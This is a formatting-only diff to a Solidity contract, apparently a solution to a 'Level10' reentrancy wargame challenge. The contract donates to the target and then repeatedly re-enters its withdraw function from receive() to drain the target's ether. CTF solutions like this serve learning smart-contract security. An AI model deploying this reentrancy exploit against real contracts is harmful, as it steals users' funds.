@@ -9,7 +9,7 @@ interface Level10 {
 }
 
 contract Reenter {
-    function reenter (Level10 _level10) external payable {
+    function reenter(Level10 _level10) external payable {
         // Donate, this will re-enter to receive function
         _level10.donate{value: msg.value}(address(this));
         // On completion, we can withdraw the remaining funds
@@ -20,9 +20,9 @@ contract Reenter {
 
     receive() external payable {
         // Stop reentrancy if there is no ether left
-        if(msg.sender.balance != 0) {
-        // Re-enter to facilitate a double withdrawal
-        Level10(msg.sender).withdraw(msg.value);
+        if (msg.sender.balance != 0) {
+            // Re-enter to facilitate a double withdrawal
+            Level10(msg.sender).withdraw(msg.value);
         }
     }
 }
